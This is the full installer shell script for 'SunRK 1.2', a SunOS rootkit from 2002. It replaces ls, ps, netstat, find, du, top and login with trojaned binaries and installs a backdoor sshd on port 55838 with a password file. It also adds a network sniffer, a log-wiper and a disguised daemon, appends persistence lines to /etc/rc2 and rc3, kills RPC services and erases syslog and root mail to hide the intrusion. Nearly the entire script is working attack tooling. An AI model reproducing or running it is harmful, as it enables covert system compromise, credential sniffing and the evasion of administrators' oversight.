#!/bin/sh
# SunRK 1.2 (SunOS rootkit)
# Coded by Nyo
# 17/02/2002
#

# Directory
USRDIR="/usr/lib/locale/cz/..."
SUNRKDIR="/usr/lib/locale/tr/..."

BLU='[1;34m'
RED='[1;31m'
RES='[0m'
DWHI='[0;37m'
GREY='[1;30m'
LWHI='[1;37m'

echo "${GREY}       __  __        _____         ____         _____        _  _        ____"
echo "${GREY}  ___ (  )(  ) _  _ (  _  ) ___   (  _ \ _____ (  _  ) ____ ( )/ ) ____ (_  _)"
echo "${DWHI} / __) )(__)( ( \( ) )(_)( / __)   )   /(  _  ) )(_)( (_  _) )  ( (_  _)  )("
echo "${DWHI} \__ \(______) )  ( (_____)\__ \  (_)\_) )(_)( (_____)  )(  (_)\_) _)(_  (__)"
echo "${LWHI} (___/        (_)\_)       (___/        (_____)        (__)       (____)"
echo
echo "                           ${BLU}-(${LWHI}+${BLU})- ${DWHI}Coded by Nyo ${BLU}-(${LWHI}+${BLU})-${RES}"
echo "                      ${BLU}-(${LWHI}+${BLU})- ${DWHI}Modified by willynux :> ${BLU}-(${LWHI}+${BLU})-${RES}"
echo

# Check if the OS is SunOS
OS=`uname -s` 
case $OS in
	SunOS)
		;;
	*)
	echo "[${RED}!${RES}] ${RED}FATAL${RES}: I tryed installing SunRK (SunOS rootkit) on $OS"
	exit 1;
		;;
	esac

# Check for SunOS Version
VERSION=`uname -r`
case $VERSION in
	5.6)
		;;
	5.7)
		;;
	5.8)
		;;
	*)
	echo "[${RED}!${RES}] ${RED}FATAL${RES}: Unsupported release of SunOS ($VERSION) ... possibly too old"
	exit 1;
		;;
	esac

# Check for x86 or sparc
CPU=`uname -i`
case $CPU in
	i86pc)
	echo "[${RED}!${RES}] ${RED}FATAL${RES}: This rootkit is precompiled for Sparc only, this system is $CPU"
		;;
	*)
		;;
	esac

echo "[${BLU}+${RES}] Installing on \"$OS - $VERSION\""
echo

# Create rootkit dirs
printf "[${BLU}+${RES}] Creating install dirs ... "
if [ -d $USRDIR ]; then
	printf "\n"
	echo "[${RED}!${RES}] ${RED}FATAL${RES}: SunRK already installed?! $USRDIR Founded!";
	exit 1;
fi;
mkdir -p $USRDIR
if [ -d $SUNRKDIR ]; then
	printf "\n"
	echo "[${RED}!${RES}] ${RED}FATAL${RES}: SunRK already installed?! $SUNRKDIR Founded!";
	exit 1;
fi;
mkdir -p $SUNRKDIR
printf "${BLU}DoNe${RES}\n"

# chmod +x utils needed by setup
chmod +x utils/resize
chmod +x utils/fix

# Trojan Function
trojan()
{
if test -f "$1"; then
utils/resize $1 $2
utils/fix $1 $2 $3
else
cp -f $2 $1
fi;
echo "[${BLU}+${RES}] $1 ... ${BLU}DoNe${RES}"
}

# Installing trojans
echo
echo "[${BLU}+${RES}] Installing Trojans ..."
cp /usr/bin/grep $SUNRKDIR/GrEp
echo "[${BLU}+${RES}] GrEp ... ${BLU}DoNe${RES}"
trojan /usr/bin/ls bin/ls $SUNRKDIR/Ls
trojan /usr/bin/du bin/du $SUNRKDIR/Du
trojan /usr/bin/find bin/find $SUNRKDIR/Find
trojan /usr/bin/ps bin/ps $SUNRKDIR/Ps
if [ -d /usr/bin/sparcv7 ]; then
cp -f /bin/sparcv7/ps $SUNRKDIR/Ps
fi;
if [ -d /usr/bin/sparcv9 ]; then
cp -f /bin/sparcv9/ps $SUNRKDIR/Ps
fi;
trojan /usr/bin/netstat bin/netstat $SUNRKDIR/Netstat
if [ -f "/usr/local/bin/top" ]; then
	trojan /usr/local/bin/top bin/top
fi;
mv bin/login /usr/bin/login
chmod +x /usr/bin/login
echo "[${BLU}+${RES}] Trojans successfully installed"

# SSHD
echo
cp -f bin/sshd/ssh_config /etc/ssh_config
cp -f bin/sshd/sshd_config /etc/sshd_config
cp -f bin/sshd/sshd2 /usr/sbin/sshd2
cp -f bin/sshd/.pwdz /usr/lib/locale/tr/.../.pwdz
cp -f bin/sshd/ssh_host_key /usr/lib/ssh_host_key
echo "[${BLU}+${RES}] sshd 1.2.33 ... ${BLU}DoNe${RES}"

# Copying Utils
echo
echo "[${BLU}+${RES}] Copying Utils to $USRDIR"
printf "[${BLU}+${RES}] FRESH Text Log-wiper ... "; cp utils/fresht $USRDIR; printf "${BLU}DoNe${RES}\n"
printf "[${BLU}+${RES}] Sun-Sniffer ... "; cp utils/sunsniff $USRDIR; printf "${BLU}DoNe${RES}\n"
printf "[${BLU}+${RES}] Stachel-Daemon ... "; cp utils/td /var/ntp/ntpstat; printf "${BLU}DoNe${RES}\n"
chmod +x /var/ntp/ntpstat
echo "[${BLU}+${RES}] Utils successfully copyed"


# Make Startup script
echo
echo "[${BLU}+${RES}] Making startup script ... "
printf "[${BLU}+${RES}] Patching /etc/rc2 ... "; echo "/usr/sbin/srload" >> /etc/rc2; printf "${BLU}DoNe${RES}\n"
printf "[${BLU}+${RES}] Patching /etc/rc2 ... "; echo "/var/ntp/ntpstat &" >> /etc/rc2; printf "${BLU}DoNe${RES}\n"
printf "[${BLU}+${RES}] Patching /etc/rc3 ... "; echo "/usr/sbin/srload" >> /etc/rc3; printf "${BLU}DoNe${RES}\n"
printf "[${BLU}+${RES}] Patching /etc/rc3 ... "; echo "/var/ntp/ntpstat &" >> /etc/rc3; printf "${BLU}DoNe${RES}\n"
printf "[${BLU}+${RES}] Installing srload ... "; cp utils/srload /usr/sbin/srload; printf "${BLU}DoNe${RES}\n"
echo "[${BLU}+${RES}] Startup script installed"

# Patching BOX
echo
echo "[${BLU}+${RES}] Patching box ..."
printf "[${BLU}+${RES}] Disabling rpc.ttdbserverd ... "
/bin/grep -v "ttdbserverd" /etc/inetd.conf > /tmp/.inetd_temp
rm /etc/inetd.conf; mv /tmp/.inetd_temp /etc/inetd.conf
echo "#!/bin/sh" > /tmp/.run
ps -fe | grep ttdb | grep -v grep | awk '{print "kill -9 "$2""}' >> /tmp/.run
chmod 755 /tmp/.run; /tmp/.run;
rm -f /usr/dt/bin/rpc.ttdbserver
printf "${BLU}DoNe${RES}\n"
printf "[${BLU}+${RES}] Disabling rpc.cmsd ... "
/bin/grep -v "rpc.cmsd" /etc/inetd.conf > /tmp/.inetd_temp
rm /etc/inetd.conf; mv /tmp/.inetd_temp /etc/inetd.conf
echo "#!/bin/sh" > /tmp/.run
ps -fe | grep cmsd | grep -v grep | awk '{print "kill -9 "$2""}' >> /tmp/.run
chmod 755 /tmp/.run; /tmp/.run;
rm -f /usr/dt/bin/rpc.cmsd /usr/openwin/bin/rpc.cmsd
printf "${BLU}DoNe${RES}\n"
printf "[${BLU}+${RES}] Disabling rpc.sadmind ... "
/bin/grep -v "sadmind" /etc/inetd.conf > /tmp/.inetd_temp
rm /etc/inetd.conf; mv /tmp/.inetd_temp /etc/inetd.conf
echo "#!/bin/sh" > /tmp/.run
ps -fe | grep sadmin | grep -v grep | awk '{print "kill -9 "$2""}' >> /tmp/.run
chmod 755 /tmp/.run; /tmp/.run;
printf "${BLU}DoNe${RES}\n"
printf "[${BLU}+${RES}] Disabling rpc.statd ... "
/bin/grep -v "statd" /etc/inetd.conf > /tmp/.inetd_temp
rm /etc/inetd.conf; mv /tmp/.inetd_temp /etc/inetd.conf
echo "#!/bin/sh" > /tmp/.run
ps -fe | grep statd | grep -v grep | awk '{print "kill -9 "$2""}' >> /tmp/.run
chmod 755 /tmp/.run; /tmp/.run;
rm -rf /usr/lib/netsvc/rstat/rpc.rstat /usr/lib/nfs/statd
printf "${BLU}DoNe${RES}\n"
printf "[${BLU}+${RES}] Disabling rquota ... "
/bin/grep -v "rquota" /etc/inetd.conf > /tmp/.inetd_temp
rm /etc/inetd.conf; mv /tmp/.inetd_temp /etc/inetd.conf
echo "#!/bin/sh" > /tmp/.run
ps -fe | grep rquota | grep -v grep | awk '{print "kill -9 "$2""}' >> /tmp/.run
chmod 755 /tmp/.run; /tmp/.run;
printf "${BLU}DoNe${RES}\n"
printf "[${BLU}+${RES}] Disabling dtspc ... "
/bin/grep -v "dtspc" /etc/inetd.conf > /tmp/.inetd_temp
rm /etc/inetd.conf; mv /tmp/.inetd_temp /etc/inetd.conf
echo "#!/bin/sh" > /tmp/.run
ps -fe | grep dtspc | grep -v grep | awk '{print "kill -9 "$2""}' >> /tmp/.run
chmod 755 /tmp/.run; /tmp/.run;
printf "${BLU}DoNe${RES}\n"
printf "[${BLU}+${RES}] Disabling rusers ... "
/bin/grep -v "rusers" /etc/inetd.conf > /tmp/.inetd_temp
rm /etc/inetd.conf; mv /tmp/.inetd_temp /etc/inetd.conf
echo "#!/bin/sh" > /tmp/.run
ps -fe | grep rusers | grep -v grep | awk '{print "kill -9 "$2""}' >> /tmp/.run
chmod 755 /tmp/.run; /tmp/.run;
printf "${BLU}DoNe${RES}\n"
printf "[${BLU}+${RES}] Disabling fingerd ... "
rm -f /usr/sbin/in.fingerd
touch /usr/sbin/in.fingerd
printf "${BLU}DoNe${RES}\n"
printf "[${BLU}+${RES}] Disabling snmp ... "
/etc/init.d/init.dmi stop
rm -f /usr/lib/dmi/snmpXdmid
printf "${BLU}DoNe${RES}\n"

echo "[${BLU}+${RES}] Patch sequence completed"

# Making rootkit config files
echo
echo "[${BLU}+${RES}] Making rootkit config files ... "
cat > $SUNRKDIR/.ptsf << EOF
Ls
Du
Find
GrEp
Ps
Netstat
Login
.ptsf
.ptsp
.ptsq
.ptsl
.pwdz
srload
fresht
sunsniff
ntpstat
th4tcplog
EOF
echo "[${BLU}++${RES}] ROOTKIT_FILES_FILE => $SUNRKDIR/.ptsf"
cat > $SUNRKDIR/.ptsp << EOF
sshd2
sunsniff
ntpstat
EOF
echo "[${BLU}++${RES}] ROOTKIT_PROCESS_FILE => $SUNRKDIR/.ptsp"
cat > $SUNRKDIR/.ptsq << EOF
60001
55838
wcom
65535
65534
65533
6667
EOF
echo "[${BLU}++${RES}] ROOTKIT_ADDRESS_FILE => $SUNRKDIR/.ptsq"
PRIMARY_INTERFACE=`/sbin/ifconfig -a | head -n 3 | grep -v "lo0" | grep flags | awk '{print $1}' | cut -d'0' -f1`
cat > $SUNRKDIR/.ptsl << EOF
/usr/sbin/sshd2 -q -p 55838 2>&1 > /dev/null
$USRDIR/sunsniff -s -d 512 -i /dev/${PRIMARY_INTERFACE} -o $USRDIR/th4tcplog 2> /dev/null &
/var/ntp/ntpstat &
EOF
echo "[${BLU}++${RES}] ROOTKIT_SRLOAD_FILE => $SUNRKDIR/.ptsl"
echo "[${BLU}++${RES}] PASSWORD_FILE => $SUNRKDIR/.pwdz"
echo "[${BLU}+${RES}] Rootkit config files maked successfully"

echo
printf "[${BLU}+${RES}] Starting srload ... "; /usr/sbin/srload; printf "${BLU}DoNe${RES}\n"
printf "[${BLU}+${RES}] Restarting inetd ... "; /usr/bin/kill -9 `ps -e | grep inetd | awk '{print $1}'`; /usr/sbin/inetd -s; printf "${BLU}DoNe${RES}\n"
printf "[${BLU}+${RES}] Erasing shits ... ";
rm -f /var/mail/root; ln -s /dev/null /var/mail/root; # Erase root mail spool
rm -f /var/log/syslog; touch /var/log/syslog;         # Erase syslog shits
printf "${BLU}DoNe${RES}\n"

# Show Box Information
echo
echo "[${BLU}+${RES}] System Information"
echo
echo "[${BLU}+${RES}] Uname Basic     : "`uname -a`
echo "[${BLU}+${RES}] Platform        : "`uname -i`
echo "[${BLU}+${RES}] SunOS Release   : $OS - $VERSION"
echo "[${BLU}+${RES}] Uptime          : `uptime | cut -d',' -f1 | cut -d'm' -f2`"
echo
echo "[${BLU}+${RES}] Hostname        : `hostname`"
echo "[${BLU}+${RES}] Password        : $PASSWORD"
echo "[${BLU}+${RES}] IP Address(s)   : "`/sbin/ifconfig -a | grep inet | grep -v '127.0.0.1' | awk '{print $2}'`
echo "[${BLU}+${RES}] Open Ports      : "`netstat -an | grep LISTEN | grep -v unix | awk '{print $1}' | cut -d'.' -f2`
echo
echo "[${BLU}+${RES}] ${BLU}SuNrK${RES} [${BLU}+${RES}]"
echo "[${BLU}+${RES}] ${BLU}Moving into the rootkit directory${RES} [${BLU}+${RES}]"
cd /usr/lib/
echo "[${BLU}+${RES}] ${BLU}Removing /dev/... :>${RES} [${BLU}+${RES}]"
rm -Rf /dev/...
echo "[${BLU}+${RES}] ${BLU}Enojy! :> ${RES} [${BLU}+${RES}]"
exit 0;
